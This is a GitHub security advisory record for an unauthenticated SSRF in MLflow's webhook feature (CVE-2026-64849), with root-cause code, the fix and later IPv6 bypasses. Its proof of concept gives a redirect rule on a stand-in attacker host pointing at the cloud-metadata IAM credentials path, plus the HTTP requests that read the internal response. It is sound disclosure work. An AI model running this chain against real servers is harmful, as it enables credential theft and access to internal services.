[{"ghsa_id":"GHSA-7gwp-5pfp-969j","cve_id":"CVE-2026-64849","url":"https://api.github.com/repos/mlflow/mlflow/security-advisories/GHSA-7gwp-5pfp-969j","html_url":"https://github.com/mlflow/mlflow/security/advisories/GHSA-7gwp-5pfp-969j","summary":"Unauthenticated full-read SSRF in MLflow webhook delivery: _validate_webhook_url bypassed via unvalidated HTTP redirects (and DNS rebinding)","description":"### Summary\r\nThe default MLflow Tracking Server (`mlflow server`, no authentication, default SQLite backend) exposes the model-registry webhooks API unauthenticated, including a synchronous `POST /api/2.0/mlflow/webhooks/{id}/test` endpoint that returns the upstream response status and body to the caller. The SSRF guard added in PR #20747 (`_validate_webhook_url`, shipped in 3.10.0) resolves the webhook hostname and rejects non-public IPs, but it is bypassable: delivery follows HTTP redirects (no `allow_redirects=False`) and never pins the validated IP. An attacker hosts a public HTTPS endpoint that passes the guard and returns `302 Location: http://169.254.169.254/...` (or `http://127.0.0.1:...`); MLflow follows it and never re-validates the redirect target. Because `/test` reflects the response body, this is an unauthenticated full-read SSRF on a default server.\r\n\r\n### Details\r\nThree facts combine:\r\n\r\n1. Webhook endpoints are unauthenticated on a default server. The only webhook authorization lives in the optional auth plugin (`mlflow/server/auth/__init__.py`, `WEBHOOK_BEFORE_REQUEST_HANDLERS`), which is not loaded by default.\r\n\r\n2. The guard validates but pins nothing — `mlflow/utils/validation.py` `_validate_webhook_url`:\r\n```python\r\nschemes = _MLFLOW_WEBHOOK_ALLOWED_SCHEMES.get()        # default [\"https\"]\r\nif parsed_url.scheme not in schemes: raise ...\r\nif not _MLFLOW_WEBHOOK_ALLOW_PRIVATE_IPS.get():        # default False\r\n    for addr_info in socket.getaddrinfo(hostname, None):\r\n        ip = ipaddress.ip_address(addr_info[4][0])\r\n        if not ip.is_global: raise ...                 # blocks RFC1918/loopback/link-local/metadata\r\n```\r\nThe resolved IP is never carried into the connection.\r\n\r\n3. Delivery follows redirects and re-resolves with no pinning — mlflow/webhooks/delivery.py:\r\n```python\r\ndef _create_webhook_session():\r\n    adapter = HTTPAdapter(max_retries=retry_strategy)  # retry only; no IP pinning\r\n    ...\r\ndef _send_webhook_request(webhook, payload, event, session):\r\n    _validate_webhook_url(webhook.url)                 # re-validates the ORIGINAL url only\r\n    return session.post(webhook.url, data=payload_bytes, headers=headers, timeout=timeout)\r\n    # no allow_redirects=False  -> 302 followed; redirect Location never re-validated\r\n```\r\ntest_webhook returns response_status and response_body to the caller.\r\nBypass vectors:\r\n\r\nRedirect-follow (reliable): attacker's allow-listed HTTPS host returns 302 to an internal/metadata URL; requests follows it.\r\nDNS rebinding (TOCTOU): getaddrinfo in the guard and the requests connect resolve independently with no pinning.\r\n\r\n### PoC\r\nAll requests are unauthenticated, sent to the MLflow tracking server (`{{TARGET}}`). The SSRF\r\nfetch is performed by the MLflow server itself; the internal response is reflected back in the\r\n`/test` response. `{{ATTACKER}}` is a host the researcher controls that resolves to a public IP\r\nand serves HTTPS with a valid certificate, returning a 302 redirect to an internal target.\r\n\r\nAttacker redirect server (on {{ATTACKER}}, valid TLS cert):\r\n    nginx:  location / { return 302 http://169.254.169.254/latest/meta-data/iam/security-credentials/; }\r\n\r\nStep 0 — negative control (proves the guard is active; the naive internal URL is rejected):\r\n\r\n    POST /api/2.0/mlflow/webhooks HTTP/1.1\r\n    Host: {{TARGET}}\r\n    Content-Type: application/json\r\n\r\n    {\"name\":\"neg\",\"url\":\"http://127.0.0.1:6379/\",\"events\":[{\"entity\":\"REGISTERED_MODEL\",\"action\":\"CREATED\"}]}\r\n\r\n    -> 400 {\"message\":\"Invalid webhook URL scheme: 'http'. Allowed schemes are: https.\"}\r\n    (an https://127.0.0.1/ variant is likewise rejected as a non-public IP)\r\n\r\n<img width=\"1154\" height=\"437\" alt=\"image\" src=\"https://github.com/user-attachments/assets/509f3a14-8774-4785-b99a-864f0b448019\" />\r\n\r\n\r\nStep 1 — create a webhook pointing at the attacker's public HTTPS host (passes _validate_webhook_url):\r\n\r\n    POST /api/2.0/mlflow/webhooks HTTP/1.1\r\n    Host: {{TARGET}}\r\n    Content-Type: application/json\r\n\r\n    {\"name\":\"poc\",\"url\":\"https://{{ATTACKER}}/innocent\",\"events\":[{\"entity\":\"REGISTERED_MODEL\",\"action\":\"CREATED\"}]}\r\n\r\n    -> 200 {\"webhook\":{\"webhook_id\":\"<WEBHOOK_ID>\", ... ,\"status\":\"ACTIVE\"}}\r\n\r\n<img width=\"1394\" height=\"520\" alt=\"image\" src=\"https://github.com/user-attachments/assets/9004705f-67e1-486f-a905-1f744eb3636d\" />\r\n\r\n\r\nStep 2 — fire it via the unauthenticated /test endpoint; the internal response body is returned:\r\n\r\n    POST /api/2.0/mlflow/webhooks/<WEBHOOK_ID>/test HTTP/1.1\r\n    Host: {{TARGET}}\r\n    Content-Type: application/json\r\n\r\n    {\"webhook_id\":\"<WEBHOOK_ID>\",\"event\":{\"entity\":\"REGISTERED_MODEL\",\"action\":\"CREATED\"}}\r\n\r\n    -> 200 {\"result\":{\"success\":true,\"response_status\":200,\r\n            \"response_body\":\"<contents of http://169.254.169.254/latest/meta-data/... fetched by the server>\"}}\r\n\r\n<img width=\"1399\" height=\"453\" alt=\"image\" src=\"https://github.com/user-attachments/assets/1e5bb020-0855-4be8-a53b-e97daeabf1dc\" />\r\n\r\n\r\nConfirmed live against mlflow==3.13.0 (default sqlite server). With the attacker host redirecting\r\nto a local secret service, Step 2 returned:\r\n    \"response_body\":\"INTERNAL_SECRET=mlflow_ssrf_proof_7f3a91\\nrole=admin\\n\"\r\n\r\nSince I don't have a cloud deployment, I placed \"my secret data\" in the same location.\r\n\r\n<img width=\"730\" height=\"208\" alt=\"image\" src=\"https://github.com/user-attachments/assets/680e1895-6d2e-4fd7-838f-c484561b6e5c\" />\r\n\r\n\r\n\r\nNotes:\r\n- Webhook `events` enum values must be UPPERCASE proto names (REGISTERED_MODEL, CREATED); lowercase\r\n  maps to ENTITY_UNSPECIFIED and 500s.\r\n- Default allowed scheme is https only; the first hop must be https, the redirect Location may be http.\r\n- Webhooks require a SQL store; the default `mlflow server` (sqlite:///mlflow.db) qualifies. No auth needed.\r\n\r\n- Credit / independent discovery: Originally reported privately by @freeman-bb via this advisory on 2026-06-12. The same vulnerability was independently discovered through code review and reported publicly by @AUTHENSOR in issue #24179 on 2026-06-26. Fixed in PR #24258. Discovery priority belongs to @freeman-bb; @AUTHENSOR is credited as an independent finder.\r\n\r\n### Impact\r\nAn unauthenticated attacker who can reach the tracking server makes the server issue HTTP requests to arbitrary internal/loopback/cloud-metadata endpoints and reads the responses via /test: cloud instance-metadata (e.g. AWS IMDS IAM credentials), internal-only admin services behind the network boundary, and internal port/host scanning. The event-driven delivery path gives the same SSRF blindly; /test makes it full-read. This is an incomplete fix of the PR #20747 guard, confirmed present on the latest release (3.13.0) and on master. Not a duplicate of CVE-2025-14279 (browser-side rebinding CSRF, CWE-352).\r\n\r\n### Fix\r\n\r\nFixed in https://github.com/mlflow/mlflow/pull/24258 (commit `ba94952247`), which adds connection-time SSRF protection (`SSRFProtectedHTTPAdapter`): the peer IP of each connected socket is validated against public-IP rules immediately after `connect()`, before any TLS/HTTP exchange. This covers the redirect targets as well (each redirect opens a new connection through the protected pool), closing both the 302-read and 307/308-write variants and the DNS-rebinding TOCTOU.\r\n\r\n### Redirect variants\r\n\r\nThe same missing re-validation enables two distinct primitives depending on the redirect status code:\r\n\r\n- **302 (read):** the redirect target is fetched with GET and, because `POST /api/2.0/mlflow/webhooks/{id}/test` reflects the upstream response body (`WebhookTestResult.response_body`), the attacker reads arbitrary internal HTTP responses (cloud metadata, internal services).\r\n- **307 / 308 (blind write):** these preserve the original POST method and body, so the attacker can POST attacker-controlled payloads into private-network management endpoints that act on POST (e.g. Docker daemon `/stop`, Elasticsearch `/_close`, Spring Boot Actuator `/shutdown`).\r\n\r\nNeither requires authentication on a default OSS server.\r\n\r\nThen add a fix reference near the top or in a \"Remediation\" note:\r\n\r\nFollow-up hardening (2026-09): four IPv6-transition bypasses of this fix were independently reported and fixed in https://github.com/mlflow/mlflow/pull/25568, released in MLflow 3.16.0. Thanks to DhiyaneshGeek and neo-ai-engineer (GHSA-7646-8p3r-42ch), kta1kri (GHSA-m56c-jhmp-2mx2), tonghuaroot (GHSA-j9pw-7jr2-x46w), and eeegoloauq (GHSA-3vv4-6hm9-pf24) for reporting.  The original is_global classifier did not decode IPv6 addresses embedding an IPv4 address, so 64:ff9b::<ip> (NAT64) and ::ffff:100.64.0.0/10 (IPv4-mapped CGNAT) could pass the guard. The SSRF guard now normalizes IPv4-mapped, 6to4, and NAT64 addresses before classification. Deployments on IPv6/NAT64 networks should upgrade to MLflow 3.16.0 or later.","severity":"high","author":null,"publisher":{"login":"PattaraS","id":5065359,"node_id":"MDQ6VXNlcjUwNjUzNTk=","avatar_url":"https://avatars.githubusercontent.com/u/5065359?v=4","gravatar_id":"","url":"https://api.github.com/users/PattaraS","html_url":"https://github.com/PattaraS","followers_url":"https://api.github.com/users/PattaraS/followers","following_url":"https://api.github.com/users/PattaraS/following{/other_user}","gists_url":"https://api.github.com/users/PattaraS/gists{/gist_id}","starred_url":"https://api.github.com/users/PattaraS/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/PattaraS/subscriptions","organizations_url":"https://api.github.com/users/PattaraS/orgs","repos_url":"https://api.github.com/users/PattaraS/repos","events_url":"https://api.github.com/users/PattaraS/events{/privacy}","received_events_url":"https://api.github.com/users/PattaraS/received_events","type":"User","user_view_type":"public","site_admin":false},"identifiers":[{"value":"GHSA-7gwp-5pfp-969j","type":"GHSA"},{"value":"CVE-2026-64849","type":"CVE"}],"state":"published","created_at":null,"updated_at":"2026-09-16T09:20:15Z","published_at":"2026-08-02T08:12:41Z","closed_at":null,"withdrawn_at":null,"submission":null,"vulnerabilities":[{"package":{"ecosystem":"pip","name":"mlflow"},"vulnerable_version_range":">= 3.10.0, < 3.15.0","patched_versions":"3.15.0","vulnerable_functions":[]}],"cvss_severities":{"cvss_v3":{"vector_string":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N","score":8.6},"cvss_v4":{"vector_string":null,"score":null}},"cwes":[{"cwe_id":"CWE-918","name":"Server-Side Request Forgery (SSRF)"}],"cwe_ids":["CWE-918"],"credits":[{"login":"freeman-bb","type":"reporter"},{"login":"y011d4","type":"finder"},{"login":"ibondarenko1","type":"finder"},{"login":"h1-mrz","type":"finder"},{"login":"th3cyb3rc0p","type":"finder"}],"credits_detailed":[{"user":{"login":"freeman-bb","id":234043877,"node_id":"U_kgDODfM55Q","avatar_url":"https://avatars.githubusercontent.com/u/234043877?v=4","gravatar_id":"","url":"https://api.github.com/users/freeman-bb","html_url":"https://github.com/freeman-bb","followers_url":"https://api.github.com/users/freeman-bb/followers","following_url":"https://api.github.com/users/freeman-bb/following{/other_user}","gists_url":"https://api.github.com/users/freeman-bb/gists{/gist_id}","starred_url":"https://api.github.com/users/freeman-bb/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/freeman-bb/subscriptions","organizations_url":"https://api.github.com/users/freeman-bb/orgs","repos_url":"https://api.github.com/users/freeman-bb/repos","events_url":"https://api.github.com/users/freeman-bb/events{/privacy}","received_events_url":"https://api.github.com/users/freeman-bb/received_events","type":"User","user_view_type":"public","site_admin":false},"type":"reporter","state":"accepted"},{"user":{"login":"y011d4","id":27393930,"node_id":"MDQ6VXNlcjI3MzkzOTMw","avatar_url":"https://avatars.githubusercontent.com/u/27393930?v=4","gravatar_id":"","url":"https://api.github.com/users/y011d4","html_url":"https://github.com/y011d4","followers_url":"https://api.github.com/users/y011d4/followers","following_url":"https://api.github.com/users/y011d4/following{/other_user}","gists_url":"https://api.github.com/users/y011d4/gists{/gist_id}","starred_url":"https://api.github.com/users/y011d4/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/y011d4/subscriptions","organizations_url":"https://api.github.com/users/y011d4/orgs","repos_url":"https://api.github.com/users/y011d4/repos","events_url":"https://api.github.com/users/y011d4/events{/privacy}","received_events_url":"https://api.github.com/users/y011d4/received_events","type":"User","user_view_type":"public","site_admin":false},"type":"finder","state":"accepted"},{"user":{"login":"ibondarenko1","id":229061622,"node_id":"U_kgDODacz9g","avatar_url":"https://avatars.githubusercontent.com/u/229061622?v=4","gravatar_id":"","url":"https://api.github.com/users/ibondarenko1","html_url":"https://github.com/ibondarenko1","followers_url":"https://api.github.com/users/ibondarenko1/followers","following_url":"https://api.github.com/users/ibondarenko1/following{/other_user}","gists_url":"https://api.github.com/users/ibondarenko1/gists{/gist_id}","starred_url":"https://api.github.com/users/ibondarenko1/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/ibondarenko1/subscriptions","organizations_url":"https://api.github.com/users/ibondarenko1/orgs","repos_url":"https://api.github.com/users/ibondarenko1/repos","events_url":"https://api.github.com/users/ibondarenko1/events{/privacy}","received_events_url":"https://api.github.com/users/ibondarenko1/received_events","type":"User","user_view_type":"public","site_admin":false},"type":"finder","state":"accepted"},{"user":{"login":"h1-mrz","id":183495090,"node_id":"U_kgDOCu_psg","avatar_url":"https://avatars.githubusercontent.com/u/183495090?v=4","gravatar_id":"","url":"https://api.github.com/users/h1-mrz","html_url":"https://github.com/h1-mrz","followers_url":"https://api.github.com/users/h1-mrz/followers","following_url":"https://api.github.com/users/h1-mrz/following{/other_user}","gists_url":"https://api.github.com/users/h1-mrz/gists{/gist_id}","starred_url":"https://api.github.com/users/h1-mrz/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/h1-mrz/subscriptions","organizations_url":"https://api.github.com/users/h1-mrz/orgs","repos_url":"https://api.github.com/users/h1-mrz/repos","events_url":"https://api.github.com/users/h1-mrz/events{/privacy}","received_events_url":"https://api.github.com/users/h1-mrz/received_events","type":"User","user_view_type":"public","site_admin":false},"type":"finder","state":"accepted"},{"user":{"login":"th3cyb3rc0p","id":54601394,"node_id":"MDQ6VXNlcjU0NjAxMzk0","avatar_url":"https://avatars.githubusercontent.com/u/54601394?v=4","gravatar_id":"","url":"https://api.github.com/users/th3cyb3rc0p","html_url":"https://github.com/th3cyb3rc0p","followers_url":"https://api.github.com/users/th3cyb3rc0p/followers","following_url":"https://api.github.com/users/th3cyb3rc0p/following{/other_user}","gists_url":"https://api.github.com/users/th3cyb3rc0p/gists{/gist_id}","starred_url":"https://api.github.com/users/th3cyb3rc0p/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/th3cyb3rc0p/subscriptions","organizations_url":"https://api.github.com/users/th3cyb3rc0p/orgs","repos_url":"https://api.github.com/users/th3cyb3rc0p/repos","events_url":"https://api.github.com/users/th3cyb3rc0p/events{/privacy}","received_events_url":"https://api.github.com/users/th3cyb3rc0p/received_events","type":"User","user_view_type":"public","site_admin":false},"type":"finder","state":"accepted"}],"collaborating_users":null,"collaborating_teams":null,"private_fork":null,"comments":11,"cvss":{"vector_string":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N","score":8.6}}]